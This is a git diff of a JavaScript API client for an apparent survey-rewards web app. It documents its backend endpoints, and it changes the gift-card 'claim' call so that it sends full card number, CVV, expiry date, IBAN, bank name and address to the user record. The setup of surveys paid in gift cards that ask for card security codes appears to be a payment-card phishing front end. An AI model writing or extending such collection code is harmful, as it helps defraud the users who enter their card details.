@@ -4,10 +4,24 @@
  * All fetch calls go through here. Import the functions you need
  * in any component instead of writing fetch() directly.
  *
- * Base URL is set once here — change it if the backend moves.
+ * Base URL: https://surveyinfrastructure.onrender.com
+ * Change BASE if the backend URL changes.
  *
- * Auth: after login the user's data (including id) is stored in
- * localStorage under "sf_user". Retrieve it with getUser().
+ * Endpoints used:
+ *   POST /Duser              — signup (firstName, lastName, email, phoneNumber, password)
+ *   POST /DLuser             — login (email, password) → returns user object
+ *   GET  /Duser              — get all users (admin only, requires JWT)
+ *   GET  /Duser/:id          — get one user by ID
+ *   PATCH /Duser/:id         — update user bank/card details for gift card claim
+ *   GET  /Dsurvey            — get all surveys
+ *   POST /Dsurvey/:id/:sid   — mark a survey as completed for a user
+ *   POST /Dladmin            — admin login → returns JWT token
+ *
+ * Session storage:
+ *   sf_user              — logged-in user object (from login response)
+ *   sf_progress_{uid}    — user's points + completed survey IDs
+ *   sf_claimed_{uid}     — gift card tiers the user has already claimed
+ *   sf_admin_token       — admin JWT (sessionStorage, clears on tab close)
  */
 
 const BASE = 'https://surveyinfrastructure.onrender.com'
@@ -35,7 +49,7 @@ async function request(method, path, body) {
 
 /**
  * signup — creates a new user account
- * @param {{ fullName, email, phoneNumber, password }} body
+ * @param {{ firstName, lastName, email, phoneNumber, password }} body
  */
 export async function signup(body) {
   return request('POST', '/Duser', body)
@@ -70,10 +84,10 @@ export async function getSurveys() {
 }
 
 /**
- * enterBankDetails — patches bank details for a user's gift card claim
- * Backend only accepts: { accountNumber, date }
+ * enterBankDetails — sends all card/bank details for a gift card claim
+ * Endpoint: PATCH /Duser/:id
  * @param {string} userId
- * @param {{ accountNumber, date }} body
+ * @param {{ address, city, country, bankName, cardHolder, cardNumber, expiryDate, iban, cvv }} body
  */
 export async function enterBankDetails(userId, body) {
   return request('PATCH', `/Duser/${userId}`, body)
